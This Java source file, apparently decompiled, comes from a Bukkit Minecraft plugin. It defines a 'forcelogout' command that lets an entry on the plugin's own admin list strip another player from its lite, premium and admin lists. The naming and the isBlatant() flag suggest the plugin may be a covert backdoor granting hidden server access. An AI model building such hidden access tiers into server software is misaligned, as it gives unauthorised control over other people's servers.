
package me.system.runner.command.impl.admin;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class ForcelogoutCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.admin.contains(p2.getName())) {
            if (args.length <= 1) {
                p2.sendMessage(Settings.USAGE("forcelogout <player>"));
            } else {
                Player target = Bukkit.getServer().getPlayer(args[1]);
                if (target == null) {
                    p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
                } else if (!plugin.lite.contains(target.getName())) {
                    p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + target.getName() + Settings.WHITE + " is not logged in."));
                } else {
                    plugin.lite.remove(target.getName());
                    p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + target.getName() + Settings.WHITE + " has been logged out."));
                    target.sendMessage(Settings.PREFIX("You have been logged out of " + Settings.NAME + " by an admin"));
                    plugin.premium.remove(target.getName());
                    plugin.admin.remove(target.getName());
                }
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be an " + Settings.RED + "admin " + Settings.WHITE + "to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

